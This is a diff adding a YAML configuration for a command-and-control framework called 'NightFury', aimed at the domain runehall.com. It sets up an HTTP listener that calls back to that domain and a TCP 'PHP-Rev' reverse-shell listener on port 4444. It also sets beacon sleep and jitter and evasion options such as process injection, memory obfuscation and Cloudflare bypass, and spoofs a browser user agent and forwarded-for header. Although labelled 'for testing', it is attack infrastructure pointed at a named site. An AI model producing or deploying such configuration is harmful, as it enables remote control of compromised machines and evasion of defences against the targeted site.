@@ -1,0 +1,35 @@
+# NightFury C2 Configuration - RuneHall Domain
+# Personalized for testing runehall.com infrastructure
+
+infrastructure:
+  domain: runehall.com
+  primary_listener:
+    protocol: https
+    port: 8443
+    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    headers:
+      Host: "api.runehall.com"
+      X-Forwarded-For: "1.1.1.1"
+
+listeners:
+  - name: "RuneHall-HTTP"
+    type: "http"
+    bind_ip: "0.0.0.0"
+    bind_port: 8080
+    callback_host: "runehall.com"
+  
+  - name: "RuneHall-PHP-Rev"
+    type: "tcp"
+    bind_ip: "0.0.0.0"
+    bind_port: 4444
+    encryption: "aes-256-cbc"
+
+beacons:
+  default:
+    jitter: 0.25
+    sleep: 60
+    kill_date: "2026-12-31"
+    evasion:
+      process_injection: true
+      memory_obfuscation: true
+      cloudflare_bypass: true
